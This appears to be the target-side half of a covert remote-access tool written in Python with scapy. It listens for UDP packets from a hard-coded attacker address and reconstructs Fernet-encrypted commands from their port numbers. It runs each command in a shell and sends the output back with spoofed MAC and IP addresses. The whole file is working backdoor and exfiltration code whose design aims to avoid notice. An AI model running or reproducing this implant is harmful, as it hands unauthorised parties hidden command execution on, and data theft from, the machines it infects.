# Target (server) code:
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import *
import base64
import subprocess
import os
from cryptography.fernet import Fernet


def load_key():
    """
    #Load the previously generated key
    """
    return open(os.path.join(sys.path[0], "secret.key"), "rb").read()


# the decrypion method of the message
def theDecryption(encrypted_message):
    """
    Decrypts an encrypted message
    """
    key = load_key()
    ciphertext = base64.b64decode(encrypted_message.encode())
    f = Fernet(key)
    decrypted_message = str(f.decrypt(ciphertext))
    he = str(decrypted_message[2:len(decrypted_message) - 1])
    return he


# the encrypion method of the message
def theEncryption(message):
    """
    Encrypts a message
    """
    key = load_key()
    encoded_message = message.encode()
    f = Fernet(key)
    encrypted_message = f.encrypt(encoded_message)
    encMsg = (base64.encodebytes(encrypted_message)).decode()
    return encMsg


ip = str(conf.route.route()[1])  # the original ip address of this computer
srcMAC = "1d:6a:b9:df:68:0f"  # the target fake mac that the target should sniff
srcIP = "67.39.210.232"  # the target fake ip that the target should sniff
attsrcMAC = "71:93:a6:80:91:ca"  # the mac add that the target should see
attsrcIP = "99.246.29.142"  # the ip add that the target should see
lenPORT = 10
charPORT = 62344
num_of_pkts_to_come: int = 0
pwdIp = "67.39.210.230"  # ip of the current location of the terminal


# send message worker
def worker(com):
    sendp(Ether(src=srcMAC) / IP(dst=ip, src=srcIP) / UDP(sport=lenPORT + len(com)))
    time.sleep(0.2)
    count = 0
    for i in com:
        count = count + 1
        port = i
        sendp(Ether(src=srcMAC)/IP(dst=ip, src=srcIP)/UDP(sport=charPORT+ord(port), dport=count))
    if pwdFlag:
        time.sleep(0.05)
        count = 0
        pwdProcess = subprocess.run("pwd", shell=True, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  # run command on shell
        pwdHelp: str = str((pwdProcess.stdout).decode())
        pwdHelp = theEncryption(pwdHelp)
        sendp(Ether(src=srcMAC) / IP(dst=ip, src=pwdIp) / UDP(sport=lenPORT + len(pwdHelp)))
        for p in pwdHelp:
            count = count + 1
            port = p
            sendp(Ether(src=srcMAC)/IP(dst=ip, src=pwdIp)/UDP(sport=charPORT + ord(port), dport=count))


# get message worker
def worker2():
    msg_arr = []
    s = sniff(filter=str("ip and src host " + attsrcIP + " and udp and src portrange " + str(lenPORT) + "-"+str(charPORT-1)),
              count=1)
    num_of_pkts_to_come = ((s[0])[UDP].sport) - lenPORT
    for i in range(num_of_pkts_to_come):
        msg_arr.append(0)
    arr = sniff(filter=str("ip and src host " + attsrcIP + " and udp and src portrange " + str(charPORT) + "-65535"),
                count=num_of_pkts_to_come)
    for i in arr:
        msg_arr[(i[UDP].dport) - 1] = chr((i[UDP].sport) - charPORT)
    msg = "".join(msg_arr)
    return str(msg)


command = ""
while command != "q":
    pwdFlag = False
    command = theDecryption(worker2())
    command = command.strip()
    if command == "q":
        continue
    if command == "cd":
        pwdFlag = True
    if command[:2] == "cd" and len(command) > 2 and command != "cd ":  # if command was 'cd xxxx' use os.chdir(path)
        process = subprocess.run(command[:len(command)], shell=True, stdin=None, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
        if '' == (process.stderr).decode():
            cdto = "cd "+command[3:].lstrip()
            try:
                os.chdir(cdto[3:])  # change dir
            except Exception as e:
                worker(theEncryption(str(sys.exc_info()[1])))
                continue
            time.sleep(0.2)
            pwdFlag = True
            worker(theEncryption(os.getcwd()))
            continue
        time.sleep(0.2)
        worker(theEncryption((process.stderr).decode()))
        continue  # no sub process this time
    process = subprocess.run(command[:len(command)], shell=True, stdin=None, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)  # run command on shell
    if '' != (process.stderr).decode():
        time.sleep(0.2)
        worker((theEncryption((process.stderr).decode())))
        continue  # no sub process this time
    time.sleep(0.2)
    help: str = str((process.stdout).decode())
    help = theEncryption(help)
    worker(help)
